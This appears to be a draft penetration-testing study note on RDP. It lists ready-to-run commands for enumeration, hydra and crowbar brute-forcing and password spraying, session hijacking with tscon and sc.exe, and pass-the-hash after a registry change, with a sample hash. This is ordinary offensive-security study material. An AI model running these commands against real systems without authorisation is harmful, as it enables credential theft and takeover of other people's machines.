---
title: rdp
aliases: []
tags:
- study-notes/rdp
category: study_notes
status: draft
date_created: '2026-08-26'
date_modified: '2026-08-26'
source: rdp.md
related_tools:
- '[[nmap]]'
- '[[xfreerdp]]'
- '[[evil-winrm]]'
- '[[hydra]]'
- '[[crowbar]]'
- '[[query user]]'
- '[[tscon.exe]]'
- '[[sc.exe]]'
- '[[xfreerdp]]'
- '[[reg]]'
related_techniques: []
related_tactics: []
related_services:
- '[[rdp]]'
related_os: []
related_notes: []
mitre_tactic: ''
mitre_technique: ''
real_path: ''
port: '3389'
protocol: tcp
os: ''
---

# rdp

## Enumeration
- `nmap -Pn -p3389 192.168.2.143`

## Connect
- desktop `xfreerdp /v:$ip /u:Administrator`
- connect `evil-winrm -u $username -i $ip`

## Brute Force
- `hydra -L user.list -P password.list rdp://$ip`
- password spray
  - [crowbar](https://github.com/galkan/crowbar)
    - `sudo apt install -y crowbar`
    - `crowbar -b rdp -s $ip/32 -U users.txt -c 'password123'`
  - hydra
    - `hydra -L usernames.txt -p 'password123' $ip rdp`

## RDP Session Hijacking
- requires system privs
- show all current user sessions `query user`
- `tscon.exe #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}`
- if admin privs only, use `sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"`
  - then `net start sessionhijack`

## RDP Pass-the-Hash
- requires DisableRestrictedAdmin `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`
- connect with hash `xfreerdp /v:$ip /u:bob /pth:300FF5E89EF33F83A8146C10F5AB9BB9`

## References
- https://github.com/galkan/crowbar

